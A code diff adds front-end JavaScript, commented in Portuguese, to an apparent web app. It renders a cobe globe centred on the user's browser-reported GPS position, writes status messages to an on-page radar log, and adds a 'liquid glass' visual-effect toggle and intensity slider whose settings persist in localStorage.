+                    else if (thetaOffset > thetaMax) thetaOffset += (thetaMax - thetaOffset) * 0.1;
+                }
+                
+                cobeGlobe.update({
+                    phi: phi + phiOffset + dragOffset.phi,
+                    theta: theta + thetaOffset + dragOffset.theta,
+                    markers: [currentGPSMarker],
+                    dark: 1,
+                    diffuse: 1.5,
+                    mapSamples: 16000,
+                    mapBrightness: 10,
+                    baseColor: [0.1, 0.1, 0.1],
+                    markerColor: [0.3, 0.45, 0.85],
+                    glowColor: [0.1, 0.1, 0.15],
+                    markerElevation: 0.02,
+                    opacity: 0.85
+                });
+                globeAnimationId = requestAnimationFrame(animate);
+            };
+
+            if (globeAnimationId) cancelAnimationFrame(globeAnimationId);
+            animate();
+            setTimeout(() => canvas.style.opacity = '1', 100);
+        };
+
+        const resizeObserver = new ResizeObserver((entries) => {
+            if (entries[0].contentRect.width > 0) {
+                initGlobeInstance();
+            }
+        });
+        resizeObserver.observe(canvas.parentElement);
+        
+    } catch (e) {
+        console.error("Failed to init cobe globe", e);
+    }
+}
+
+// Inicia captura de GPS
+let watchGpsId = null;
+
+// Globals to center the globe on GPS acquire
+let targetGlobePhi = null;
+let targetGlobeTheta = null;
+
+function startGPS() {
+    if ("geolocation" in navigator) {
+        const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
+        // Obter primeira posição imediatamente
+        navigator.geolocation.getCurrentPosition(pos => {
+            currentGPSMarker = { location: [pos.coords.latitude, pos.coords.longitude], size: 0.08, id: 'user' };
+            // Calculate radians for Cobe (phi = longitude, theta = latitude roughly)
+            targetGlobePhi = Math.PI - (pos.coords.longitude * Math.PI) / 180;
+            targetGlobeTheta = (pos.coords.latitude * Math.PI) / 180;
+            appendRadarLog(`<iconify-icon icon="solar:radar-line-duotone"></iconify-icon> Sinal Satélite Adquirido (Lat: ${pos.coords.latitude.toFixed(4)}, Lon: ${pos.coords.longitude.toFixed(4)})`);
+        }, err => {
+            appendRadarLog(`<iconify-icon icon="solar:danger-triangle-line-duotone" style="color:var(--red);"></iconify-icon> Falha ao obter GPS: ${err.message}`);
+        }, options);
+
+        // Assistir mudanças em tempo real
+        watchGpsId = navigator.geolocation.watchPosition(pos => {
+            currentGPSMarker = { location: [pos.coords.latitude, pos.coords.longitude], size: 0.08, id: 'user' };
+        }, err => {
+            console.warn("GPS watch error", err);
+        }, options);
+    } else {
+        appendRadarLog(`<iconify-icon icon="solar:danger-triangle-line-duotone" style="color:var(--red);"></iconify-icon> GPS Não Suportado`);
+    }
+}
+
+function stopGPS() {
+    if (watchGpsId !== null) {
+        navigator.geolocation.clearWatch(watchGpsId);
+        watchGpsId = null;
+    }
+}
+
+function appendRadarLog(text) {
+    const logsEl = document.getElementById('radar-logs');
+    if (!logsEl) return;
+    const item = document.createElement('div');
+    item.style.cssText = 'color: #fff; font-size: 13px; font-weight: 500; display: flex; align-items: center; gap: 8px; background: rgba(255,255,255,0.05); padding: 8px 12px; border-radius: 8px; animation: slideInRadar 0.3s cubic-bezier(0.16, 1, 0.3, 1); border: 1px solid rgba(255,255,255,0.03);';
+    item.innerHTML = text;
+    logsEl.prepend(item);
+    
+    // Limita max logs
+    if (logsEl.children.length > 5) {
+        logsEl.lastChild.remove();
+    }
+}
+
+// Iniciar radar automaticamente se ele for clicado, ou iniciar no boot
+document.querySelectorAll('.seg-btn[data-target="view-radar"]').forEach(btn => {
+    btn.addEventListener('click', () => {
+        if (!cobeGlobe) {
+            initRadarGlobe();
+            startGPS();
+        }
+    });
+});
+
+
+
+// ═══════════ LIQUID GLASS CONTROLLER ═══════════
+const liquidSlider = document.getElementById('liquid-glass-slider');
+const glassDisplacement = document.getElementById('glass-displacement');
+const glassBlurFinal = document.getElementById('glass-blur-final');
+const glassBlurNoise = document.getElementById('glass-blur-noise');
+
+if (liquidSlider && glassDisplacement) {
+    const toggleLiquid = document.getElementById('toggle-liquid-glass');
+    const sliderContainer = document.getElementById('liquid-slider-container');
+    
+    // Carregar valores salvos
+    const savedGlassIntensity = localStorage.getItem('liquidGlassIntensity');
+    const isLiquidEnabled = localStorage.getItem('liquidGlassEnabled') === 'true';
+
+    // Estado do Toggle
+    if (toggleLiquid) {
+        toggleLiquid.checked = isLiquidEnabled;
+        updateSystemGlassMode(isLiquidEnabled);
+
+        toggleLiquid.addEventListener('change', (e) => {
+            const enabled = e.target.checked;
+            localStorage.setItem('liquidGlassEnabled', enabled);
+            updateSystemGlassMode(enabled);
+        });
+    }
+
+    function updateSystemGlassMode(enabled) {
+        if (enabled) {
+            document.body.classList.add('liquid-glass-enabled');
+            if (sliderContainer) {
+                sliderContainer.style.opacity = '1';
+                sliderContainer.style.pointerEvents = 'auto';
+            }
+        } else {
+            document.body.classList.remove('liquid-glass-enabled');
+            if (sliderContainer) {
+                sliderContainer.style.opacity = '0.5';
+                sliderContainer.style.pointerEvents = 'none';
+            }
+        }
+    }
+
+    // Estado do Slider
+    if (savedGlassIntensity !== null) {
+        liquidSlider.value = savedGlassIntensity;
+        applyLiquidIntensity(savedGlassIntensity);
+    }
+
+    liquidSlider.addEventListener('input', (e) => {
+        const val = e.target.value;
+        applyLiquidIntensity(val);
+        localStorage.setItem('liquidGlassIntensity', val);
+    });
+
+    function applyLiquidIntensity(val) {
+        // Val vai de 10 (Sutil) a 150 (Intenso).
+        // Mapeamos para uma distorção menor, pois o SVG foi otimizado (sem blur SVG, usando blur CSS nativo)
+        const scale = (val / 150) * 40; 
+        
+        glassDisplacement.setAttribute('scale', scale);
+    }
+}
